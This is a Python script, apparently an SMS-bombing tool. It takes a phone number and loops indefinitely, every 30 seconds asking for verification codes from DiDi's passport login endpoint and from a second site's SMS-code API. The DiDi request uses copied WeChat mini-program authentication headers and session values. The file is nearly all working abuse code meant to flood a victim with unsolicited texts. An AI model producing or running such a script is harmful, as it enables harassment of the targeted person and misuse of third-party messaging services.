import requests
import json
import time

print('七月')
def send_code(phone_number):
    url = 'https://epassport.diditaxi.com.cn/passport/login/v5/codeMT'
    headers = {
        'Host': 'epassport.diditaxi.com.cn',
        'Connection': 'keep-alive',
        'Content-Length': '455',
        'Mpxlogin-Ver': '5.5.1',
        'content-type': 'application/x-www-form-urlencoded',
        'secdd-authentication': '49afb436f1b4de01ccd95876718546a2ee095f5762fd80e5b45c6017a80b6d73e09ebd0ba9c3ef1cd29888d9ca528e19bf0e73cf9401000001000000',
        'secdd-challenge': '3|2.0.11||||||',
        'Accept-Encoding': 'gzip,compress,br,deflate',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.56(0x1800382d) NetType/WIFI Language/zh_CN',
        'Referer': 'https://servicewechat.com/wx9e9b87595c41dbb7/491/page-frame.html'
    }
    data = {
        'q': '{"api_version":"1.0.1","appid":35011,"role":1,"device_name":"iPhone XS Max China-exclusive<iPhone11,6>","sec_session_id":"BxdYpEmKtRAjVQKCUbzheJtWBkjiT5ZYQ1S4k8ZpEQEbICRRc7Iom6gG3EFtcOYj","policy_id_list":[50008256],"policy_name_list":[],"ddfp":"","lang":"zh-CN","wsgenv":"","cell":"转换手机号","country_calling_code":"+86","code_type":1,"scene":1}'
    }
    # 替换手机号
    data['q'] = data['q'].replace('"cell":"转换手机号"', f'"cell":"{phone_number}"')

    try:
        response = requests.post(url, headers=headers, data=data)
        if response.status_code == 200:
            print(response.text)
        else:
            print("请求失败")
            return None
    except requests.RequestException as e:
        print("发生网络错误,状态码:{e}")
        return None
def send_code2(phone_number):
    url = f'https://stdch5.huinongyun.cn/api-uaa/validata/smsCode/{phone_number}/voc'

    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(response.text)
        else:
            print("请求失败")
            return None
    except requests.RequestException as e:
        logging.error(f"发生网络错误: {e}")
        return None

phone = input("手机号:")

while True:
	send_code(phone)
	time.sleep(30)
	send_code2(phone)
	time.sleep(30)
